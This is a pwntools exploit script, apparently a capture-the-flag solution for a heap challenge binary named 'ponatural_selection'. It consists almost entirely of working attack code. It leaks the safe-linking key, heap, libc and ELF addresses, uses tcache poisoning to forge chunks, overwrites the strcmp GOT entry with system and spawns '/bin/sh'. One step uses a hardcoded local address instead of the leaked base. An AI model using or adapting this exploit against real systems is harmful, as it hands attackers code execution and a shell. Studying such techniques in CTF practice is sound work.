#!/usr/bin/python3

from pwn import *

exe = ELF('ponatural_selection_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


                c
                ''')
        input()


s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))
uu64 = lambda : u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
lg = lambda s : info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
pr = lambda s : print('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)

GDB()

def menu(choice):
    ru(">> ")
    sl(str(choice))

def add(content):
    menu(1)
    ru("Enter data: ")
    s(content)

def delete(index):
    menu(2)
    ru("Insert delete position: ")
    sl(str(index))

def show():
    menu(3)

def edit(index,content):
    menu(4)
    ru("Insert change position: ")
    sl(str(index))
    ru("Enter data: ")
    s(content)
def clear_func():
    menu(5)
add("Wolf")
add("Lion")
add("Tiger")
delete(1)  #Wolf -> Tiger
add("aaaa") # Wolf -> Tiger -> aaaa -> Tiger
delete(1) #  Wolf -> aaaa -> free chunk -> aaaa, count 2
show()
ru('aaaa -> ')
key = u64(rn(5).ljust(8,b'\x00'))
heap_base = key << 12
lg("heap_base")
delete(1)
delete(0)
edit(3,p64(key^(heap_base+0x40)))
clear_func()
add("aaaa")
clear_func()
add("aaaa")
clear_func()
add(p64(0)+p64(0x251)+b"\x07\x00"*3+b"\x07")
clear_func()


add("Wolf")
add("Lion")
add("Tiger")
delete(1)  #Wolf -> Tiger
add("aaaa") # Wolf -> Tiger -> aaaa -> Tiger
delete(1) #  Wolf -> aaaa -> free chunk -> aaaa, count 2
delete(1)
delete(0)
edit(3,p64(key^(heap_base+0x290)))
clear_func()
add("aaaa")
clear_func()
add("aaaa")
clear_func()
add(p64(0)+p64(0x241))
clear_func()

add("Wolf")
add("Lion")
add("Tiger")
clear_func()
add("Wolf")
add("Lion")
add("Tiger")
clear_func()



add("Wolf")
add("Lion")
add("Tiger")
delete(1)  #Wolf -> Tiger
add("aaaa") # Wolf -> Tiger -> aaaa -> Tiger
delete(1) #  Wolf -> aaaa -> free chunk -> aaaa, count 2
delete(1)
delete(0)
edit(3,p64(key^(heap_base+0x2a0)))

clear_func()
add("aaaa")
clear_func()
add("aaaa")
clear_func()
add("bbbb")
delete(0)
clear_func()
add("aaaa")
show()
ru("->")
ru("-> ")
libc_base = u64(rn(6).ljust(8,b'\x00'))-0x1f6ce0
lg("libc_base")
stdout_addr=0x1f5e20+libc_base
lg("stdout_addr")
for i in range(15):
    clear_func()
    add("Wolf")
clear_func()

add("Wolf")
add("Lion")
add("Tiger")
delete(1)  #Wolf -> Tiger
add("aaaa") # Wolf -> Tiger -> aaaa -> Tiger
delete(1) #  Wolf -> aaaa -> free chunk -> aaaa, count 2
delete(1)
delete(0)
edit(3,p64(key^(heap_base+0x6d0)))
clear_func()
add("aaaa")
clear_func()
add("aaaa")
clear_func()
add(flat(0, stdout_addr))
clear_func()

add("Wolf")
add("Lion")
add("Tiger")
delete(1)  #Wolf -> Tiger
add("aaaa") # Wolf -> Tiger -> aaaa -> Tiger
delete(1) #  Wolf -> aaaa -> free chunk -> aaaa, count 2
delete(1)
delete(0)
edit(3,p64(key^(heap_base+0x700)))
clear_func()
add("aaaa")
clear_func()
add("aaaa")
clear_func()
add(flat(0, heap_base+0x6c0))
clear_func()

add("Wolf")
add("Lion")
add("Tiger")
delete(1)  #Wolf -> Tiger
add("aaaa") # Wolf -> Tiger -> aaaa -> Tiger
delete(1) #  Wolf -> aaaa -> free chunk -> aaaa, count 2
delete(1)
delete(0)
edit(3,p64(key^(heap_base+0x720)))
clear_func()
add("aaaa")
clear_func()
add("aaaa")
clear_func()
add(flat(0))
lg("stdout_addr")

show()
ru("-> ")
ru("-> ")
ru("-> ")
elf_base=u64(rn(6).ljust(8,b'\x00'))-0x4060
lg("elf_base")

stcmp_got=0x4028+elf_base
sys=libc_base+libc.sym['system']

clear_func()

add("Wolf")
add("Lion")
add("Tiger")
delete(1)  #Wolf -> Tiger
add("aaaa") # Wolf -> Tiger -> aaaa -> Tiger
delete(1) #  Wolf -> aaaa -> free chunk -> aaaa, count 2
delete(1)
delete(0)
edit(3,p64(key^(0x555555558000)))
clear_func()
add("aaaa")
clear_func()
add("aaaa")
clear_func()
add(flat(sys, libc_base+libc.sym.puts))
clear_func()

add("/bin/sh")
delete(0)


p.interactive()
